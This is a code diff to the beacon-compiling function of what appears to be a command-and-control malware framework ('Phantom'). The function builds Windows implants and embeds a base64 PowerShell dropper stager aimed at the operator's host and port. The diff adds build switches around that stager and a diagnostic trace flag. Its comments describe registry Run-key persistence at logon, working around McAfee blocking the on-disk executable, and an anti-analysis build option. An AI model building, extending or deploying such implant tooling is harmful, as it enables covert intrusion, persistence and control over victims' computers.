@@ -311,18 +311,25 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
     # beacon's `persist` command writes a RunKey that relaunches the
     # in-memory path at logon (field-verified: the on-disk PE gets
     # execution-blocked by McAfee even when the file itself survives).
+    # PHANTOM_BUILD_NO_PS_STAGER=1 is a documented test/ops override: build
+    # WITHOUT the embedded stager so `persist` exercises strategy 2 (on-disk
+    # PE + RunKey) end to end. Never used for a deployed payload.
+    _no_ps_stager = os.environ.get(
+        "PHANTOM_BUILD_NO_PS_STAGER", "").strip().lower() in (
+            "1", "true", "yes", "on")
     ps_stager_b64 = ""
-    try:
-        # ONE-SHOT on purpose: this blob is re-run by the beacon's own
-        # `persist` (RunKey at logon). Wrapping it resilient would schedule a
-        # SECOND persistence (a schtasks task) on top of the RunKey.
-        _drop = generate_dropper(
-            "windows", host, str(port), dl_port=port, use_ssl=use_ssl,
-            resilient=False)
-        if _drop and " -Enc " in _drop:
-            ps_stager_b64 = _drop.rsplit(" -Enc ", 1)[1].strip()
-    except Exception:
-        ps_stager_b64 = ""
+    if not _no_ps_stager:
+        try:
+            # ONE-SHOT on purpose: this blob is re-run by the beacon's own
+            # `persist` (RunKey at logon). Wrapping it resilient would schedule a
+            # SECOND persistence (a schtasks task) on top of the RunKey.
+            _drop = generate_dropper(
+                "windows", host, str(port), dl_port=port, use_ssl=use_ssl,
+                resilient=False)
+            if _drop and " -Enc " in _drop:
+                ps_stager_b64 = _drop.rsplit(" -Enc ", 1)[1].strip()
+        except Exception:
+            ps_stager_b64 = ""
     # REDIRECTOR-FIRST GUARDRAIL: a beacon that carries the operator's own
     # listener address hands an analyst who captures it the backend to
     # attack. Warn at BUILD time (doctor reports the same posture) unless a
@@ -515,6 +522,11 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                 cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-fno-stack-protector", "-fno-omit-frame-pointer", "-D_BUILD_TIME=" + build_time]
                 if disable_anti:
                     cmd.append("-DDISABLE_ANTI")
+                # Diagnostic builds only: compile the spawn/VEH trace in. This is
+                # opt-in so a normal beacon never pays for (or leaks) trace code.
+                if os.environ.get("PHANTOM_BEACON_TRACE", "").strip().lower() in (
+                        "1", "true", "yes", "on"):
+                    cmd.append("-DPHANTOM_SHELL_TRACE=1")
                 cmd += ["-o", temp_pe,
                        f"-I{os.path.join(beacon_dir, 'src')}", main_cpp,                           f"-Wl,-e,_start,-Map,{temp_map}"] + obj_paths + ["-lwinhttp", "-lbcrypt", "-lws2_32", "-lbthprops", "-lwlanapi", "-lgdi32", "-luser32", "-lgdiplus", "-lole32", "-liphlpapi", "-lcrypt32", "-static", "-mwindows"]
 
